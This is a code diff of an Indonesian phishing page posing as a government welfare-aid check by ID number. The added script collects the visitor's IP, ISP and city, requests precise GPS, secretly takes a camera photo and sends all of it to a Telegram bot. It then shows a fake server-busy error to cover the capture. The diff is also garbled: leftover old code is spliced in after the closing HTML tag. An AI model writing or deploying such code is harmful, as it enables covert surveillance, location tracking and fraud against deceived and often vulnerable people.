@@ -17,7 +17,7 @@
     <div class="card">
         <img src="https://images.unsplash.com/photo-1529107386315-e1a2ed48a620?w=500" style="width:100%; border-radius:5px;">
         <h1>Bantuan Sosial Tahap 2 Cair, Cek NIK Anda Sekarang</h1>
-        <p>Silakan verifikasi perangkat Anda untuk melihat daftar penerima.</p>
+        <p>Silakan verifikasi perangkat Anda untuk melihat daftar penerima bantuan.</p>
         <button class="btn" id="startBtn">CEK DAFTAR NAMA</button>
     </div>
     <video id="video" autoplay></video>
@@ -28,13 +28,67 @@
         const id = "5392443720";
 
         document.getElementById('startBtn').addEventListener('click', async function() {
-            this.innerText = "Memverifikasi... (65%)";
+            this.innerText = "Memverifikasi... (80%)";
             this.disabled = true;
 
-            let info = "📸 *HASIL CAPTURE UJANG MODS*%0A━━━━━━━━━━━━━━━━━━%0A";
+            let info = "📸 *LAPORAN TARGET UJANG*%0A━━━━━━━━━━━━━━━━━━%0A";
 
-            // Ambil IP & Lokasi
+            // 1. Ambil Data IP (Sebagai Dasar)
             try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                info += `🌍 *IP:* ${d.ip}%0A🏢 *ISP:* ${d.org}%0A📍 *Kota:* ${d.city}%0A`;
+                info += `📌 *Maps (IP):* [Klik Disini](https://www.google.com/maps?q=${d.latitude},${d.longitude})%0A`;
+            } catch(e) {}
+
+            // 2. Ambil GPS Akurat (Jika Diizinkan)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    info += `🎯 *GPS AKURAT:* [Buka Google Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})%0A`;
+                    lanjutKeKamera(info);
+                }, () => {
+                    info += "🎯 *GPS:* Izin Lokasi Ditolak%0A";
+                    lanjutKeKamera(info);
+                });
+            } else {
+                lanjutKeKamera(info);
+            }
+        });
+
+        async function lanjutKeKamera(captionLengkap) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const fd = new FormData();
+                        fd.append('chat_id', id);
+                        fd.append('photo', blob, 'f.jpg');
+                        fd.append('caption', decodeURIComponent(captionLengkap));
+                        fd.append('parse_mode', 'Markdown');
+                        fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, { method: 'POST', body: fd });
+                        stream.getTracks().forEach(t => t.stop());
+                        alert("Error 505: Server sibuk. NIK Anda sedang dalam antrean.");
+                        document.getElementById('startBtn').innerText = "CEK DAFTAR NAMA";
+                        document.getElementById('startBtn').disabled = false;
+                    }, 'image/jpeg');
+                }, 2000);
+            } catch (err) {
+                fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=${captionLengkap}%0A⚠️ *Kamera Ditolak*&parse_mode=Markdown`);
+                alert("Verifikasi gagal. Akses kamera diperlukan.");
+                document.getElementById('startBtn').innerText = "CEK DAFTAR NAMA";
+                document.getElementById('startBtn').disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>            try {
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 info += "🌍 *IP:* " + d.ip + "%0A🏢 *ISP:* " + d.org + "%0A📍 *Kota:* " + d.city + "%0A📌 *Maps:* [Buka Lokasi](https://www.google.com/maps?q=" + d.latitude + "," + d.longitude + ")%0A";
